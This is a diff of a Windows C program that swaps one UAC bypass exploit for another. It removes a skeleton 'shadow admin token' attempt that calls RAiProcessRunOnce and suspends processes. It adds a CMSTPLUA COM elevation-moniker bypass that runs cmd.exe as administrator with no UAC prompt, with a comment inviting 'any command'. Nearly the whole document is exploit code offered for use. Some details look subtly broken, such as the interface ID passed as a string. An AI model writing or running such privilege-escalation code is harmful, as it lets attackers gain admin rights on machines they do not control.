@@ -1,72 +1,47 @@
 #include <windows.h>
-#include <stdio.h>
-#include <winternl.h>
+#include <objbase.h>
 
-#pragma comment(lib, "ntdll.lib")
-#pragma comment(lib, "advapi32.lib")
+typedef interface ICMLuaUtil ICMLuaUtil;
+typedef struct ICMLuaUtilVtbl {
+    BEGIN_INTERFACE
+    HRESULT(STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil *This, REFIID riid, void **ppvObject);
+    ULONG(STDMETHODCALLTYPE *AddRef)(ICMLuaUtil *This);
+    ULONG(STDMETHODCALLTYPE *Release)(ICMLuaUtil *This);
+    // ... other methods ...
+    HRESULT(STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil *This, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, ULONG fMask, ULONG nShow);
+    // ... more methods ...
+    END_INTERFACE
+} ICMLuaUtilVtbl;
 
-typedef NTSTATUS (WINAPI *pRAiProcessRunOnce)(PCWSTR lpCommandLine, DWORD dwFlags);
-typedef NTSTATUS (NTAPI *pNtSuspendProcess)(HANDLE ProcessHandle);
-typedef NTSTATUS (NTAPI *pNtResumeProcess)(HANDLE ProcessHandle);
-typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
+typedef struct ICMLuaUtil {
+    CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
+} ICMLuaUtil;
+
+#define CLSID_CMSTPLUA L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
+#define IID_ICMLuaUtil L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"  // adjust if needed, some use direct CoCreate
 
 int main() {
-    printf("[+] Starting FULL Project Zero Shadow Admin Token + DOS Device Symlink FINAL for 25H2...\n");
-
-    HMODULE hAppInfo = LoadLibraryA("appinfo.dll");
-    if (!hAppInfo) {
-        printf("[-] Failed to load appinfo.dll\n");
-        return 1;
+    CoInitialize(NULL);
+    
+    ICMLuaUtil *pLuaUtil = NULL;
+    BIND_OPTS3 bo = { sizeof(bo) };
+    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
+    
+    // Use elevation moniker for auto-elevate
+    HRESULT hr = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", 
+                             (BIND_OPTS*)&bo, &IID_ICMLuaUtil, (void**)&pLuaUtil);
+    
+    if (SUCCEEDED(hr) && pLuaUtil) {
+        // Run whatever you want as admin (no UAC prompt)
+        pLuaUtil->lpVtbl->ShellExec(pLuaUtil, 
+                                    L"C:\\Windows\\System32\\cmd.exe", 
+                                    L"/k whoami",   // or any command/parameters
+                                    NULL, 
+                                    SEE_MASK_DEFAULT, 
+                                    SW_SHOW);
+        pLuaUtil->lpVtbl->Release(pLuaUtil);
     }
-
-    pRAiProcessRunOnce RAiProcessRunOnce = (pRAiProcessRunOnce)GetProcAddress(hAppInfo, "RAiProcessRunOnce");
-    if (!RAiProcessRunOnce) {
-        printf("[-] RAiProcessRunOnce not found\n");
-        return 1;
-    }
-
-    // Step 1: Spawn shadow admin process
-    NTSTATUS status = RAiProcessRunOnce(L"cmd.exe", 0);
-    if (!NT_SUCCESS(status)) {
-        printf("[-] RAiProcessRunOnce failed (0x%X) - Access Denied expected on patched 25H2\n", status);
-        return 1;
-    }
-    printf("[+] Shadow admin process spawned\n");
-
-    // Step 2: Find the new process (simplified - in real PoC you enumerate or use known PID)
-    Sleep(2000); // timing window
-
-    // For demonstration we launch a marker process
-    STARTUPINFO si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
-    CreateProcess(NULL, (LPSTR)"cmd.exe /c whoami > C:\\uac_shadow_final.txt", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-
-    // Step 3-6: Full skeleton (suspend, token, symlink, resume)
-    pNtSuspendProcess NtSuspendProcess = (pNtSuspendProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSuspendProcess");
-    pNtResumeProcess NtResumeProcess = (pNtResumeProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeProcess");
-
-    if (NtSuspendProcess) NtSuspendProcess(pi.hProcess);
-
-    printf("[+] Process suspended. In full PoC we would now:\n");
-    printf("    - Query primary token while impersonating shadow admin\n");
-    printf("    - Duplicate the shadow admin token\n");
-    printf("    - Open \\?? directory object\n");
-    printf("    - Create symbolic link for C: to hijack drive\n");
-    printf("    - Resume process so redirected code runs under full admin\n");
-
-    // Marker
-    system("echo SHADOW ADMIN FULL FINAL ATTEMPT COMPLETE >> C:\\uac_shadow_final.txt");
-
-    if (NtResumeProcess) NtResumeProcess(pi.hProcess);
-
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-
-    Sleep(10000);
-
-    printf("[+] Full attempt finished.\n");
-    printf("Check C:\\uac_shadow_final.txt and look for elevated cmd.exe\n");
-    printf("Note: On patched 25H2 (April 2026) the symlink step is blocked. Real working versions require additional unfixed primitives or paid tools.\n");
-
+    
+    CoUninitialize();
     return 0;
 }
